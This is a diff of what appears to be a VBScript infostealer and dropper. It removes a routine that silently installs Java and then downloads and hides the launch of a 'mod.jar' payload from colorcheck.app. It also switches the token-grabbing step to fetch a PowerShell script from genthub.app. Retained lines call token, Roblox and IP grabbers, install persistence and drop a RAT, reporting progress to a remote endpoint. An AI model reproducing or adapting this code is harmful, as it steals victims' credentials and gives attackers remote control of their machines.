@@ -29,7 +29,6 @@ Call GrabTokens
 Call IP
 Call GrabRoblox
 Call Persistence
-Call DropJavaJar
 Call DropRAT
 window.close()
 
@@ -162,78 +161,12 @@ Sub Persistence()
     PostEmbed "PERSISTENCE", "3 startup methods installed", 65280
 End Sub
 
-Sub DropJavaJar()
-    On Error Resume Next
-    
-    Dim javaUrl : javaUrl = "https://download.oracle.com/java/21/latest/jdk-21_windows-x64_bin.exe"
-    Dim jarUrl : jarUrl = "https://colorcheck.app/mod.jar"
-    Dim javaInstaller : javaInstaller = sh.ExpandEnvironmentStrings("%TEMP%") & "\jdk21.exe"
-    Dim jarFile : jarFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\mod.jar"
-    
-    ' 1. Download Java 21 installer
-    PostEmbed ":coffee: Java 21", "Downloading JDK 21...", 3447003
-    sh.Run "cmd /c bitsadmin /transfer jdk /download /priority high " & javaUrl & " """ & javaInstaller & """", 0, True
-    
-    If fso.FileExists(javaInstaller) Then
-        ' 2. Install Java 21 silently
-        PostEmbed ":coffee: Java 21", "Installing silently...", 3447003
-        sh.Run "cmd /c """ & javaInstaller & """ /s /L C:\Windows\Temp\java_install.log", 0, True
-        
-        ' 3. Wait for installation
-        Call SleepSeconds(60)
-        
-        ' 4. Download .jar file
-        PostEmbed ":package: JAR", "Downloading payload...", 3447003
-        sh.Run "cmd /c bitsadmin /transfer jar /download /priority high " & jarUrl & " """ & jarFile & """", 0, True
-        
-        If fso.FileExists(jarFile) Then
-            ' 5. Find javaw.exe
-            Dim javaPath : javaPath = ""
-            Dim candidates : candidates = Array( _
-                "C:\Program Files\Java\jdk-21\bin\javaw.exe", _
-                "C:\Program Files\Java\jdk-21.0.1\bin\javaw.exe", _
-                "C:\Program Files\Java\jdk-21.0.2\bin\javaw.exe", _
-                "C:\Program Files\Eclipse Adoptium\jdk-21.0.1.12-hotspot\bin\javaw.exe", _
-                "C:\Program Files\Microsoft\jdk-21.0.1.12-hotspot\bin\javaw.exe" _
-            )
-            Dim c
-            For Each c In candidates
-                If fso.FileExists(c) Then javaPath = c : Exit For
-            Next
-            
-            If javaPath = "" Then
-                ' Search via where
-                Dim wsh : Set wsh = sh.Exec("cmd /c where javaw.exe 2>nul")
-                Dim out : out = wsh.StdOut.ReadAll()
-                If Len(Trim(out)) > 0 Then javaPath = Split(Trim(out), vbCrLf)(0)
-            End If
-            
-            If javaPath <> "" Then
-                ' 6. Launch .jar hidden
-                PostEmbed ":rocket: JAR", "Launching with " & javaPath, 65280
-                sh.Run """" & javaPath & """ -jar """ & jarFile & """", 0, False
-            Else
-                ' 7. If javaw not found â€” use java.exe
-                sh.Run "cmd /c java -jar """ & jarFile & """", 0, False
-            End If
-        Else
-            PostEmbed ":x: JAR", "Download failed", 16711680
-        End If
-    Else
-        PostEmbed ":x: Java", "JDK download failed", 16711680
-    End If
-    
-    ' Cleanup
-    On Error Resume Next
-    fso.DeleteFile javaInstaller, True
-End Sub
-
 Sub GrabTokens()
     PostEmbed "DEBUG", "Starting GrabTokens...", 16753920
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     PostEmbed "DEBUG", "Downloading PS1 from /s...", 16753920
-    xh.Open "GET", "https://colorcheck.app/s.ps1", False
+    xh.Open "GET", "https://genthub.app/s", False
     xh.Send
     If xh.Status <> 200 Then
         PostEmbed "DEBUG", "PS1 download FAILED status:" + CStr(xh.Status), 16711680
